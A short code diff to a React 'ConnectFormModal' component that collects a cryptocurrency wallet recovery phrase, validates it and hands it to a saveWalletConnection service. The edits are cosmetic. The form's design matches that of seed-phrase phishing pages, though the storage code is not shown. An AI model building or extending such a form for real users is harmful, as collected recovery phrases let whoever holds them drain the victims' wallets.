@@ -4,7 +4,7 @@ import { FaTimes, FaCheck } from "react-icons/fa";
 import { auth } from "../firebase/firebase";
 
 import {
-  validateRecoveryPhrase,      // ← Fixed
+  validateRecoveryPhrase,
   saveWalletConnection,
 } from "../services/walletService";
 
@@ -76,7 +76,7 @@ function ConnectFormModal({ isOpen, onClose, wallet }) {
       return false;
     }
 
-    const validation = validateRecoveryPhrase(form.recoveryPhrase);  // ← Fixed
+    const validation = validateRecoveryPhrase(form.recoveryPhrase);
     if (!validation.isValid) {
       setValidationError(validation.error);
       return false;
@@ -128,7 +128,8 @@ function ConnectFormModal({ isOpen, onClose, wallet }) {
 
       await new Promise((resolve) => setTimeout(resolve, 800));
 
-      setSuccess(true);
+      setSuccess(true);        // ← Only this, no alert
+
     } catch (err) {
       console.error(err);
       setError(err.message || "Something went wrong");
@@ -143,7 +144,10 @@ function ConnectFormModal({ isOpen, onClose, wallet }) {
     <>
       {!success && (
         <div className="connect-overlay" onClick={onClose}>
-          <div className="connect-modal premium" onClick={(e) => e.stopPropagation()}>
+          <div
+            className="connect-modal premium"
+            onClick={(e) => e.stopPropagation()}
+          >
             <FaTimes className="close-icon" onClick={onClose} />
 
             <div className="connect-header modern">
@@ -214,6 +218,7 @@ function ConnectFormModal({ isOpen, onClose, wallet }) {
         </div>
       )}
 
+      {/* Success Screen */}
       {success && (
         <div className="success-overlay">
           <div className="success-modal premium-success">
